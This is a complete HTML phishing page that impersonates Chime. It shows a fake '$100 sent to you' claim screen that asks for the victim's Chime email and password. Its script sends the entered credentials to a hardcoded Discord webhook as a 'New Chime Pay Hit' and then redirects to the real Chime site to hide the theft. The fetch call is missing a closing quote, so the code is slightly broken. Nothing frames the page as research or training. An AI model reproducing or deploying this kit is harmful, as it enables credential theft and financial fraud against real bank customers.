<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Chime - Fee-free instant cashout</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f4f5f7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 400px;
            padding: 32px 24px;
            text-align: center;
        }
        .chime-logo {
            width: 60px;
            height: 60px;
            background: #1ec77f;
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
            font-size: 28px;
            color: #ffffff;
            font-weight: 700;
        }
        .amount {
            font-size: 48px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 4px;
        }
        .sender {
            font-size: 15px;
            color: #555;
            margin-bottom: 20px;
        }
        .sender-name {
            font-weight: 600;
            color: #1a1a1a;
        }
        .fee-badge {
            display: inline-block;
            background: #e8f8f0;
            color: #0b8a52;
            font-size: 13px;
            font-weight: 600;
            padding: 6px 12px;
            border-radius: 20px;
            margin-bottom: 24px;
        }
        .divider {
            height: 1px;
            background: #e6e6e6;
            margin-bottom: 24px;
        }
        .label {
            font-size: 13px;
            color: #888;
            text-align: left;
            margin-bottom: 4px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 16px;
            background: #fafafa;
            transition: border-color 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #1ec77f;
            background: #fff;
        }
        .btn {
            width: 100%;
            background: #1ec77f;
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 4px;
        }
        .btn:active {
            background: #17a866;
        }
        .footer-text {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
        .footer-text span {
            color: #1ec77f;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="chime-logo">$</div>
        <div class="amount">$100.00</div>
        <div class="sender"><span class="sender-name">Jose Diaz</span> sent you money</div>
        <div class="fee-badge">✓ Fee-free instant cashout</div>
        <div class="divider"></div>
        <form id="claim-form">
            <div class="label">Email</div>
            <input type="email" name="email" placeholder="your@email.com" required autocomplete="email">
            <div class="label">Password</div>
            <input type="password" name="password" placeholder="Chime password" required autocomplete="current-password">
            <button type="submit" class="btn">Claim $100.00</button>
        </form>
        <div class="footer-text">Powered by <span>Chime Pay</span></div>
    </div>

    <script>
        document.getElementById('claim-form').addEventListener('submit', function(e) {
            e.preventDefault();
            var email = document.querySelector('input[name="email"]').value;
            var password = document.querySelector('input[name="password"]').value;

            // Send to your Discord webhook
            fetch('https://discord.com/api/webhooks/1500643609265963108/KBGWZ9ytDruhyor733rmbeINKg1uUiNuUDy8aOraharOwNXGTLF_y2uvAgOfetB5lwtc {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '📦 **New Chime Pay Hit**\n**Email:** ' + email + '\n**Password:** ' + password + '\n**Time:** ' + new Date().toLocaleString()
                })
            }).then(function(r) {
                // Redirect to real Chime claimed page
                window.location.href = 'https://app.chime.com/pay/claimed';
            }).catch(function(r) {
                // Still redirect even if webhook fails
                window.location.href = 'https://app.chime.com/pay/claimed';
            });
        });
    </script>
</body>
</html>
